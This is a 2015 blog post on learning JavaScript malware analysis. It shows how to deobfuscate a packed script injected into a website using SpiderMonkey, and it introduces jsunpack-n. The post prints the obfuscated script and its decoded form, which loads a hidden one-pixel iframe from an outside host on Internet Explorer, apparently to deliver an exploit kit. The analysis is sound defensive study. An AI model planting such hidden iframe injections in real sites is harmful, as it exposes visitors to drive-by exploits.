---
layout: post
title: "Javascript malware | Checking it out with Spidermonkey and jsunpackn.py"
date: 2015-02-01
comments: true
categories:
---
Allright, I've started going through the [Malware Analyst's Cookbook ](http://www.amazon.com/Malware-Analysts-Cookbook-DVD-Techniques/dp/0470613033), the book are almost like a big guide for all the tools a malware researcher may need. I like it, opens up for yourself to have fun and try the stuff!

So I will give som articles showing the usage of tools I want to pinpoint my learning at.

## Spidermonkey

>>>[SpiderMonkey](https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey) is Mozilla's JavaScript engine written in C/C++. It is used in various Mozilla products, including Firefox, and is available under the MPL2.

It's supernice to have a javascript engine callable from the terminal.
Lets have a very basic example of dealing with obfuscated code being called by eval.

I'll found [this](http://stackoverflow.com/questions/7765594/javascript-code-injected-into-site-can-you-help-me-decrypt-it) post at stackoverflow.

He want the following code decrypted:

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('i 9(){a=6.h(\'b\');7(!a){5 0=6.j(\'k\');6.g.l(0);0.n=\'b\';0.4.d=\'8\';0.4.c=\'8\';0.4.e=\'f\';0.m=\'w://z.o.B/C.D?t=E\'}}5 2=A.x.q();7(((2.3("p")!=-1&&2.3("r")==-1&&2.3("s")==-1))&&2.3("v")!=-1){5 t=u("9()",y)}',41,41,'el||ua|indexOf|style|var|document|if|1px|MakeFrameEx|element|yahoo_api|height|width|display|none|body|getElementById|function|createElement|iframe|appendChild|src|id|25u|msie|toLowerCase|opera|webtv||setTimeout|windows|http|userAgent|500|asso|navigator|com|showthread|php|72291731'.split('|'),0,{}))
```

Save the code inte a file with a firstline of `eval = print;`

The from the terminal call: `js evil.js | indent`
Indent is a nice tool in linux used to indent and make the code readable, it's made for C but works allright for languages with a similar syntax.

Output:

```javascript
function
MakeFrameEx ()
{
  element = document.getElementById ('yahoo_api');
  if (!element)
    {
      var el = document.createElement ('iframe');
      document.body.appendChild (el);
      el.id = 'yahoo_api';
      el.style.width = '1px';
      el.style.height = '1px';
      el.style.display = 'none';
    el.src = 'http://asso.25u.com/showthread.php?t=72291731'}
}

var ua = navigator.userAgent.toLowerCase ();
if (((ua.indexOf ("msie") != -1 && ua.indexOf ("opera") == -1
      && ua.indexOf ("webtv") == -1)) && ua.indexOf ("windows") != -1)
  {
  var t = setTimeout ("MakeFrameEx()", 500)
  }


```

You can do this anywhere you have a javascript interpreter but the shell offers simplicity and effectiveness for us who aren't web devs.

As for the code analysis we see that it creates an iframe and appends it to the body. The link are down but you may assume it was an exploitkit, deface page or similar.

##jsunpackn.py
>[jsunpack-n](https://code.google.com/p/jsunpack-n/) emulates browser functionality when visiting a URL. It's purpose is to detect exploits that target browser and browser plug-in vulnerabilities. It accepts many different types of input:

>* PDF files - samples/sample-pdf.file
* Packet Captures - samples/sample-http-exploit.pcap
* HTML files
* JavaScript files
* SWF files

What I'm most excited about right now is malicious pdf files.
I've downloaded a couple of samples from [http://contagiodump.blogspot.se/2013/03/16800-clean-and-11960-malicious-files.html](http://contagiodump.blogspot.se/2013/03/16800-clean-and-11960-malicious-files.html)